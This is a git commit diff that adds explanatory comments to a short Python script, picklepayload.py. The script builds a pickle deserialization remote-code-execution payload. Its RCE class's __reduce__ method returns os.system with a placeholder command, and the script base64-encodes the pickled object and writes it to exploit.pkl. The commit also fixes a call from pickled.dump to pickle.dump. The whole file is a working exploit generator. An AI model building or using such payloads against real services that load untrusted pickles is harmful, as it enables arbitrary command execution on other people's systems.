c4e101a2304cea3a905b8a491183fe57b3e8b67e
wolftech0110 <wolftech0110@gmail.com>
2025-03-30 20:30:26 -0400

    Added Comments to code

--- Pickle/picklepayload.py
+++ Pickle/picklepayload.py
@@ -1,17 +1,21 @@
-import pickle
-import base64
-import os
+import pickle  # Import the pickle module for serializing and deserializing objects
+import base64  # Import base64 for encoding binary data to ASCII
+import os      # Import os for executing system commands
 
-
+# Define a class for demonstrating remote code execution
 class RCE:
     def __reduce__(self):
+        # Command to be executed (in a real scenario, this could be any command)
         cmd = ('Payload')
+        # Return a tuple for os.system to execute the command during deserialization
         return os.system, (cmd,)
 
-
+# Main block to execute when the script is run directly
 if __name__ == '__main__':
+    # Serialize the RCE object and encode it in base64 for safe transmission
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
 
+    # Write the serialized payload to a file
     with open('exploit.pkl', 'wb') as f:
-    pickled.dump(RCE(), f)
+        pickle.dump(RCE(), f)  # Corrected this line to use pickle.dump
